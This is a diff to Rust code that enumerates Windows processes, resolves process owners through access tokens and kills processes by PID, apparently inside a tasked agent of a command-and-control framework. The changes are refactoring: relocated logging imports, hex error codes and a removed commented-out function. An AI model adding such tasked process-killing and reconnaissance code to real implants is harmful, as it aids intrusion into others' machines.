@@ -1,8 +1,6 @@
 //! Native interactions with Windows Processes
 
 use serde::Serialize;
-#[cfg(debug_assertions)]
-use shared::pretty_print::print_failed;
 use shared::{
     stomped_structs::Process,
     tasks::{Task, WyrmResult},
@@ -27,6 +25,7 @@ use windows_sys::Win32::{
     },
 };
 
+use crate::utils::console::print_failed;
 use crate::utils::strings::utf_16_to_string_lossy;
 
 pub fn running_process_details() -> Option<impl Serialize> {
@@ -134,8 +133,6 @@ fn lookup_process_owner_name(pid: u32) -> String {
     if result == 0 {
         #[cfg(debug_assertions)]
         {
-            use shared::pretty_print::print_failed;
-
             let gle = unsafe { GetLastError() };
             print_failed(format!(
                 "Failed to initially open token on process {pid}. {gle:#X}"
@@ -166,8 +163,6 @@ fn lookup_process_owner_name(pid: u32) -> String {
         if result == 0 {
             #[cfg(debug_assertions)]
             {
-                use shared::pretty_print::print_failed;
-
                 let gle = unsafe { GetLastError() };
                 print_failed(format!(
                     "Failed to read token info on process {pid}. {gle:#X}"
@@ -211,8 +206,6 @@ fn lookup_process_owner_name(pid: u32) -> String {
         if result == 0 {
             #[cfg(debug_assertions)]
             {
-                use shared::pretty_print::print_failed;
-
                 let gle = unsafe { GetLastError() };
                 print_failed(format!("Failed to lookup account SID {pid}. {gle:#X}"));
             }
@@ -227,8 +220,6 @@ fn lookup_process_owner_name(pid: u32) -> String {
     } else {
         #[cfg(debug_assertions)]
         {
-            use shared::pretty_print::print_failed;
-
             let gle = unsafe { GetLastError() };
             print_failed(format!(
                 "No data received when trying to open token {pid}. {gle:#X}"
@@ -261,14 +252,14 @@ pub fn kill_process(pid: &Task) -> Option<WyrmResult<String>> {
 
     let handle = unsafe { OpenProcess(PROCESS_TERMINATE, FALSE, pid as _) };
     if handle.is_null() {
-        return Some(WyrmResult::Err(format!("Error code: {}", unsafe {
+        return Some(WyrmResult::Err(format!("Error code: {:#X}", unsafe {
             GetLastError()
         })));
     }
 
     if unsafe { TerminateProcess(handle, 0) } == FALSE {
         let _ = unsafe { CloseHandle(handle) };
-        return Some(WyrmResult::Err(format!("Error code: {}", unsafe {
+        return Some(WyrmResult::Err(format!("Error code: {:#X}", unsafe {
             GetLastError()
         })));
     }
@@ -277,22 +268,13 @@ pub fn kill_process(pid: &Task) -> Option<WyrmResult<String>> {
 
     #[cfg(debug_assertions)]
     {
-        use shared::pretty_print::print_success;
+        use crate::utils::console::print_success;
+
         print_success(format!("Successfully terminated process {pid}"));
     }
 
     Some(WyrmResult::Ok(pid.to_string()))
 }
-
-// fn sort_processes(processes: Vec<Process>) {
-//     let mut sp = SortedProcesses(vec![]);
-//     for p in processes {
-//         if sp.0.is_empty() {
-//             sp.0.insert(p.pid as usize, SortedProcess::from(p.clone()));
-//             continue;
-//         }
-//     }
-// }
 
 fn enum_all_processes() -> Option<Vec<Process>> {
     let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0) };
